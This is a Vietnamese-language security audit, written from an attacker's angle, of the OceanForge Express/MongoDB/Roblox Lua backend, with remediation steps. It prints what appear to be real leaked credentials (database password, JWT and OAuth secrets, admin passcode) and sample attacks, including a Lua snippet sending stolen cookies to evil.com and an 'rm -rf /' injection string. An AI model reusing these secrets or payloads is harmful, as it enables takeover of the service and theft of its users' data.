# 🔴 BÁO CÁO ĐÁNH GIÁ BẢO MẬT — GÓC NHÌN KẺ TẤN CÔNG

> **Mục tiêu:** OceanForge Backend (Express.js + MongoDB + Roblox Lua Pipeline)
> **Vai trò:** Black-hat Penetration Tester
> **Ngày:** 2026-08-01
> **Điểm bảo mật tổng thể: 3.5 / 10 ⚠️**

---

## 📊 Tổng Kết Nhanh

| Mức độ | Số lỗ hổng | Biểu tượng |
|--------|-----------|-------------|
| 🔴 CRITICAL | 5 | Có thể chiếm quyền toàn bộ hệ thống |
| 🟠 HIGH | 4 | Có thể đánh cắp dữ liệu / leo quyền |
| 🟡 MEDIUM | 4 | Có thể khai thác trong điều kiện cụ thể |
| 🟢 LOW | 2 | Lỗi thiết kế, ít ảnh hưởng trực tiếp |

---

## 🔴 CRITICAL-01: Secrets Đã Bị Commit Vào Git — TOÀN BỘ HỆ THỐNG BỊ COMPROMISE

> [!CAUTION]
> **Đây là lỗ hổng nghiêm trọng nhất.** File `.env` chứa MỌI bí mật đã bị commit vào Git history. Dù `.gitignore` hiện tại chặn `.env`, nhưng **nó đã được push trước đó** và vẫn tồn tại trong lịch sử Git.

### Bí mật bị lộ (từ [.env](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/.env)):
```
MongoDB Connection String:  mongodb+srv://ngkhanhabc187_db_user:jPpPuF5eVLvlZUmZ@cluster0.6vfie92.mongodb.net/...
JWT Secret:                 super_secret_oceanforge_jwt_key_129847
Database Encryption Key:    a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Google OAuth Client Secret: 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
Discord OAuth Secret:       jKWMZOMs5NizM9_NGIQ9BpPiGi7Bascy
```

### 🎯 Kịch bản tấn công:
```bash
# Kẻ tấn công chỉ cần clone repo và xem lịch sử
git log --all --diff-filter=A -- "backend/.env"
git show a27bd26:backend/.env  # ← Lấy TOÀN BỘ secrets
```

**Hậu quả:**
- ✅ Kết nối trực tiếp vào MongoDB Atlas → **đọc/xóa/sửa toàn bộ database**
- ✅ Forge JWT token → **đăng nhập bất kỳ tài khoản nào**
- ✅ Decrypt mọi dữ liệu mã hóa trong database
- ✅ Giả mạo OAuth flow → chiếm tài khoản Google/Discord

### Khắc phục:
1. **NGAY LẬP TỨC** rotate tất cả secrets (MongoDB password, JWT Secret, OAuth credentials)
2. Sử dụng `git filter-branch` hoặc `BFG Repo-Cleaner` để xóa `.env` khỏi lịch sử Git
3. Sử dụng secret manager (Vault, Google Secret Manager) thay vì `.env`

---

## 🔴 CRITICAL-02: Admin Passcode Hardcoded — Chiếm Quyền Admin Dễ Dàng

> [!CAUTION]
> Admin passcode được hardcode trực tiếp trong source code tại [admin.js:10](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/admin.js#L10).

```javascript
const MASTER_ADMIN_PASSCODE = process.env.ADMIN_PASSCODE || 'khanh2007nw';
```

Và còn tệ hơn — response trả về **admin token cũng bị hardcode**:
```javascript
adminToken: 'admin_unlocked_token_khanh2007nw'  // line 30
```

### 🎯 Kịch bản tấn công:
```bash
# Bước 1: Đăng ký tài khoản bình thường
curl -X POST /api/auth/register -d '{"username":"hacker","email":"h@h.com","password":"123456","captcha":"..."}'

# Bước 2: Lấy JWT token, rồi bypass admin với passcode đã biết
curl -X POST /api/admin/verify-passcode \
  -H "Authorization: Bearer <jwt_token>" \
  -H "Content-Type: application/json" \
  -d '{"passcode": "khanh2007nw"}'

# Bước 3: Truy cập TOÀN BỘ admin API — xem raw telemetry của mọi user
curl -X GET /api/admin/lua-logs \
  -H "Authorization: Bearer <jwt_token>" \
  -H "x-admin-passcode: khanh2007nw"
```

### Khắc phục:
1. Di chuyển `ADMIN_PASSCODE` sang `.env` (không có fallback hardcoded)
2. Sử dụng `role === 'admin'` check thay vì passcode
3. Xóa hardcoded admin token khỏi response

---

## 🔴 CRITICAL-03: Supply Chain Attack — Lua Script Từ GitHub Không Xác Thực

> [!CAUTION]
> Route `/api/lua/load` tại [lua.js:123](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/lua.js#L123) fetch và **thực thi code trực tiếp** từ GitHub mà không có bất kỳ verification nào.

```javascript
const response = await axios.get(
  'https://raw.githubusercontent.com/hyuttgg/lua-/refs/heads/main/khanh.lua',
  { timeout: 5000 }
);
scriptContent = response.data; // ← Thực thi trực tiếp, KHÔNG verify
```

### 🎯 Kịch bản tấn công:
1. **Compromise GitHub account `hyuttgg`** (phishing, credential stuffing, stolen token)
2. Push Lua script độc hại → `khanh.lua`
3. **Mọi Roblox client sẽ tự động tải và chạy malware**

```lua
-- Kẻ tấn công inject vào khanh.lua:
local stolen_data = game:GetService("HttpService"):JSONEncode({
    cookies = "...", -- steal auth cookies
    place_id = game.PlaceId,
    players = -- steal all player data
})
game:GetService("HttpService"):PostAsync("https://evil.com/steal", stolen_data)
```

### Khắc phục:
1. Thêm **checksum verification** (SHA-256 hash) cho script trước khi serve
2. Pin commit hash thay vì dùng `refs/heads/main` (branch có thể bị force-push)
3. Cache script locally và so sánh hash trước khi update
4. Thêm Content Security Policy cho script content

---

## 🔴 CRITICAL-04: JWT Secret Hardcoded Fallback — Forge Token Bất Kỳ

Tại [auth.js:21](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/auth.js#L21) và nhiều nơi khác:

```javascript
jwt.verify(token, process.env.JWT_SECRET || 'super_secret_key');
```

Nếu `JWT_SECRET` env var không được set (ví dụ: deploy lỗi), hệ thống **tự động fallback sang giá trị hardcoded đã biết**.

### 🎯 Kịch bản tấn công:
```javascript
// Kẻ tấn công forge JWT token cho bất kỳ user nào
const jwt = require('jsonwebtoken');
const fakeToken = jwt.sign(
  { id: 'VICTIM_USER_ID' }, 
  'super_secret_key',  // Hardcoded fallback!
  { expiresIn: '7d' }
);
// Sử dụng fakeToken để truy cập mọi API
```

### Khắc phục:
1. **Xóa tất cả fallback values** — nếu JWT_SECRET không set, server phải **crash ngay** khi khởi động
2. Thêm startup validation:
```javascript
if (!process.env.JWT_SECRET) throw new Error('FATAL: JWT_SECRET not configured');
```

---

## 🔴 CRITICAL-05: Lua Script Injection Qua String Replace

Tại [lua.js:143-155](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/lua.js#L143-L155):

```javascript
scriptContent = scriptContent.replace(
  '_G.OceanForgeApiKey = ""',
  `_G.OceanForgeApiKey = "${finalApiKey}"`
);
```

`finalApiKey` là JWT token — nếu token chứa ký tự đặc biệt (dấu `"`, `\`), nó sẽ **break cú pháp Lua** hoặc cho phép **code injection**.

### 🎯 Kịch bản tấn công:
Nếu attacker kiểm soát được giá trị `apiKey` (hoặc JWT payload bị craft), có thể inject:
```
" .. os.execute("rm -rf /") .. "
```

### Khắc phục:
1. Escape tất cả special characters trong `finalApiKey` trước khi inject
2. Sử dụng template engine thay vì string replace
3. Validate rằng finalApiKey chỉ chứa `[a-zA-Z0-9._-]`

---

## 🟠 HIGH-01: CORS Bypass — Server Mở Cửa Cho Mọi Client Không Có Origin

Tại [corsConfig.js:38-43](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/corsConfig.js#L38-L43):

```javascript
} else {
  // Non-browser client (Lua HttpService, curl, Postman)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
  res.setHeader('Access-Control-Allow-Headers', '*');
}
```

**Khi request KHÔNG có `Origin` header** → server cho phép **MỌI THỨ**. Bất kỳ tool nào (curl, Postman, custom script) đều bypass hoàn toàn CORS protection.

Thêm vào đó, CORS check cũng dễ bypass:
```javascript
cleanOriginStr.includes('localhost')  // Attacker dùng: evil-localhost.com ✅
cleanOriginStr.includes('127.0.0.1') // Attacker dùng: evil127.0.0.1.com ✅
```

### 🎯 Kịch bản tấn công:
```bash
# Bypass CORS hoàn toàn — chỉ cần không gửi Origin header
curl -X GET https://your-server.com/api/accounts \
  -H "Authorization: Bearer <stolen_jwt>"
# → Server trả về Access-Control-Allow-Origin: *
```

### Khắc phục:
1. Từ chối requests không có Origin header cho browser-facing routes
2. Dùng `===` exact match thay vì `.includes()` cho origin validation
3. Chỉ wildcard cho `/api/lua/*` routes (Roblox HttpService)

---

## 🟠 HIGH-02: API Key Là HMAC Secret — Architectural Flaw

Tại [luaSignature.js:80-83](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/luaSignature.js#L80-L83):

```javascript
const computedSignature = crypto
  .createHmac('sha256', apiKey)  // ← API Key CHÍNH LÀ HMAC secret!
  .update(message)
  .digest('hex');
```

API Key vừa là **identity** (gửi trong header `x-api-key`) vừa là **signing secret**. Ai có API Key = **có toàn quyền giả mạo requests**.

Nhưng API Key được:
- Trả về trong response khi đăng ký/đăng nhập ([auth.js:104](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/auth.js#L104))
- Hiển thị trên frontend dashboard
- Gửi qua Lua script (inject vào `_G.OceanForgeApiKey`)

### 🎯 Kịch bản tấn công:
```javascript
// Bất kỳ ai có API Key (từ Lua script, network sniffing, etc.) 
// đều có thể forge HMAC signatures
const crypto = require('crypto');
const apiKey = 'forge_abc123...'; // Stolen from Lua script
const payload = '{"username":"FakeAccount","level":9999}';
const timestamp = Math.floor(Date.now() / 1000);
const nonce = crypto.randomBytes(16).toString('hex');
const message = payload + timestamp + nonce;
const signature = crypto.createHmac('sha256', apiKey).update(message).digest('hex');
```

### Khắc phục:
1. Tách biệt API Key (identity) và Signing Secret (authentication)
2. Signing Secret KHÔNG BAO GIỜ được gửi qua header hay client code
3. Sử dụng asymmetric cryptography (RSA/ECDSA) thay vì HMAC

---

## 🟠 HIGH-03: Nonce Cache In-Memory — Không Bền Vững

Tại [luaSignature.js:7](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/luaSignature.js#L7):

```javascript
const nonceCache = new Map(); // ← Mất sạch khi restart!
```

### 🎯 Kịch bản tấn công:
1. Capture một request hợp lệ (nonce + signature + timestamp)
2. Đợi server restart (deploy mới, crash, etc.)
3. **Replay request** → nonce cache trống → request được chấp nhận

Thêm vào đó, nếu chạy **multiple instances** (load balancer), mỗi instance có cache riêng → replay dễ dàng.

### Khắc phục:
1. Sử dụng Redis/Memcached cho nonce cache
2. Persist nonces vào database với TTL index

---

## 🟠 HIGH-04: User Data Leak Qua Map API

Tại [map.js:18-119](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/map.js#L18-L119), route `GET /api/map/users` trả về **dữ liệu nhạy cảm của TẤT CẢ users** cho bất kỳ user đã đăng nhập:

```json
{
  "username": "victim_user",
  "ip": "118.69.xxx.xxx",     // ← IP thật
  "lat": 10.823,              // ← Vị trí GPS chính xác
  "lng": 106.629,
  "os": "Windows 11",
  "browser": "Chrome 126",
  "loginMethod": "Discord",
  "loginTime": "..."
}
```

### 🎯 Kịch bản tấn công:
Bất kỳ user nào đăng ký tài khoản → gọi API → **lấy IP + GPS chính xác + device info của TOÀN BỘ users khác**.

### Khắc phục:
1. Giới hạn API này cho admin role
2. Mask IP addresses (chỉ hiển thị 2 octet đầu)
3. Làm mờ GPS coordinates (chỉ hiển thị cấp tỉnh/thành phố)

---

## 🟡 MEDIUM-01: Content Security Policy Quá Lỏng

Tại [helmetConfig.js:30-35](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/helmetConfig.js#L30-L35):

```javascript
"default-src": ["'self'", "*"],           // ← Cho phép TẤT CẢ domains
"script-src": ["'self'", "'unsafe-inline'", "'unsafe-eval'"],  // ← XSS heaven
"frame-ancestors": ["*"],                  // ← Clickjacking possible
```

- `default-src: *` → Vô nghĩa, cho phép load resource từ bất kỳ đâu
- `unsafe-inline` + `unsafe-eval` → XSS có thể chạy bất kỳ JS nào
- `frame-ancestors: *` → Site có thể bị nhúng iframe cho clickjacking

### Khắc phục:
1. Xóa `*` khỏi `default-src`, chỉ cho phép domains cụ thể
2. Xóa `unsafe-eval`, sử dụng nonce-based CSP cho inline scripts
3. Đặt `frame-ancestors` thành `'self'` hoặc domains cụ thể

---

## 🟡 MEDIUM-02: No HSTS — Downgrade Attack

Tại [helmetConfig.js:42](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/helmetConfig.js#L42):

```javascript
hsts: false, // Disabled!
```

Không có HSTS → kẻ tấn công trên cùng mạng (WiFi công cộng) có thể **downgrade HTTPS xuống HTTP** và intercept mọi traffic.

### Khắc phục:
```javascript
hsts: {
  maxAge: 31536000, // 1 year
  includeSubDomains: true,
  preload: true
}
```

---

## 🟡 MEDIUM-03: Rate Limiter Bypass — Key By API Key

Tại [rateLimiter.js:41-44](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/middleware/rateLimiter.js#L41-L44):

```javascript
keyGenerator: (req) => {
  return req.headers['x-api-key'] || 'anonymous';
}
```

- Gửi requests **không có `x-api-key`** → tất cả đều key = `'anonymous'` → DDoS amplification
- Rotate giữa nhiều API keys → bypass rate limit hoàn toàn

### Khắc phục:
1. Kết hợp IP + API Key làm rate limit key
2. Tăng strict rate limit cho key `'anonymous'`

---

## 🟡 MEDIUM-04: Mock Store Plaintext Passwords

Tại [auth.js:124](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/routes/auth.js#L124):

```javascript
if (!user || user.password !== password) {  // ← Plaintext comparison!
```

Khi `global.dbConnected === false`, mock store so sánh password dạng **plaintext**. Nếu development server bị expose hoặc `dbConnected` bị manipulate:

### Khắc phục:
1. Luôn hash passwords, kể cả trong mock store
2. Thêm guard: nếu `NODE_ENV === 'production'`, **từ chối mock store hoàn toàn**

---

## 🟢 LOW-01: Error Messages Leak Stack Traces

Tại [server.js:127](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/server.js#L127) và nhiều routes khác:

```javascript
res.status(500).json({ success: false, message: error.message });
```

`error.message` có thể chứa thông tin nhạy cảm (database connection strings, file paths, internal logic).

### Khắc phục:
```javascript
const message = process.env.NODE_ENV === 'production' 
  ? 'Internal server error' 
  : error.message;
```

---

## 🟢 LOW-02: Socket.io Broadcast Quá Nhiều Thông Tin

Tại [server.js:248-263](file:///d:/Users/khanh/Desktop/quản lý acc python/backend/server.js#L248-L263):

```javascript
io.emit('user_online', {
  ip: activeSession.ip,        // ← Broadcast IP cho TẤT CẢ connected clients
  username: activeSession.username,
  // ...
});
```

`io.emit` broadcast cho **TẤT CẢ connected sockets** — nghĩa là mọi user online đều nhận được IP, vị trí GPS, device info của user mới đăng nhập.

### Khắc phục:
1. Chỉ emit cho admin room
2. Xóa IP và thông tin nhạy cảm khỏi broadcast payload

---

## 🗺️ Sơ Đồ Tấn Công Tổng Hợp

```mermaid
graph TD
    A["🔴 Git History .env Leak"] --> B["Full Database Access"]
    A --> C["Forge ANY JWT Token"]
    A --> D["OAuth Account Takeover"]
    
    E["🔴 Hardcoded Admin Passcode"] --> F["Admin Panel Access"]
    F --> G["View ALL User Telemetry"]
    
    H["🔴 GitHub Supply Chain"] --> I["Malicious Lua Code Execution"]
    I --> J["Steal Roblox Player Data"]
    
    K["🟠 CORS Bypass"] --> L["Cross-Site Request Forgery"]
    M["🟠 API Key = HMAC Secret"] --> N["Forge Telemetry Updates"]
    O["🟠 Map API Leak"] --> P["Track User IP + GPS"]
    
    C --> Q["Impersonate ANY User"]
    Q --> O
    Q --> F

    style A fill:#ff4444,color:#fff
    style E fill:#ff4444,color:#fff
    style H fill:#ff4444,color:#fff
    style K fill:#ff8800,color:#fff
    style M fill:#ff8800,color:#fff
    style O fill:#ff8800,color:#fff
```

---

## ✅ Điểm Tích Cực (Đã Làm Tốt)

| Tính năng | Đánh giá |
|-----------|----------|
| Bcrypt password hashing (salt 12) | ✅ Tốt |
| Zod schema validation cho inputs | ✅ Tốt |
| NoSQL injection protection (key sanitization) | ✅ Cơ bản |
| HMAC + Nonce + Timestamp design (ý tưởng) | ✅ Đúng hướng |
| Rate limiting có phân tầng | ✅ Tốt |
| Timing-safe comparison cho signatures | ✅ Tốt |
| IP-based registration limit (5 acc/IP) | ✅ Tốt |

---

## 📋 Thứ Tự Ưu Tiên Khắc Phục

| # | Lỗ hổng | Ưu tiên | Thời gian ước tính |
|---|---------|---------|-------------------|
| 1 | **Rotate ALL secrets** (MongoDB, JWT, OAuth) | 🔴 NGAY | 30 phút |
| 2 | **Xóa .env khỏi Git history** | 🔴 NGAY | 15 phút |
| 3 | **Xóa hardcoded admin passcode** | 🔴 NGAY | 10 phút |
| 4 | **Thêm script integrity check** (SHA-256) | 🔴 Trong ngày | 1-2 giờ |
| 5 | **Xóa JWT secret fallback** | 🔴 Trong ngày | 15 phút |
| 6 | **Fix CORS origin validation** | 🟠 Tuần này | 30 phút |
| 7 | **Tách API Key và HMAC Secret** | 🟠 Tuần này | 2-3 giờ |
| 8 | **Giới hạn Map API cho admin** | 🟠 Tuần này | 30 phút |
| 9 | **Redis cho nonce cache** | 🟠 Tháng này | 1-2 giờ |
| 10 | **Fix CSP headers** | 🟡 Tháng này | 30 phút |
| 11 | **Enable HSTS** | 🟡 Tháng này | 5 phút |

---

> [!WARNING]
> **Kết luận từ "kẻ phá hoại":** Hệ thống hiện tại có thiết kế bảo mật theo đúng hướng (HMAC, rate limiting, sanitization), nhưng có **5 lỗ hổng CRITICAL** có thể bị khai thác ngay lập tức. Nguy hiểm nhất là `.env` trong Git history — kẻ tấn công chỉ cần `git clone` là có toàn quyền database và forge JWT. Cần **rotate secrets NGAY LẬP TỨC** trước khi làm bất cứ điều gì khác.
